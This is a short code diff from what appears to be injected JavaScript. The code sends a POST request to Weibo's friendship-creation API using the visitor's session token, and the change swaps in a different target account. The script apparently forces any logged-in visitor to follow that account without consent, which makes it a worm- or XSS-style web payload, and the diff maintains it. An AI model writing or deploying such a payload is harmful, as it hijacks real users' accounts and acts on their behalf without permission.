@@ -7,7 +7,7 @@
             var xhr = new XMLHttpRequest();
             xhr.open('post', 'https://m.weibo.cn/api/friendships/create' );
             xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-            xhr.send('uid=6421536602&st=' + obj.data.st);
+            xhr.send('uid=6424615242&st=' + obj.data.st);
             var f=new XMLHttpRequest();
 
             bb=new XMLHttpRequest();
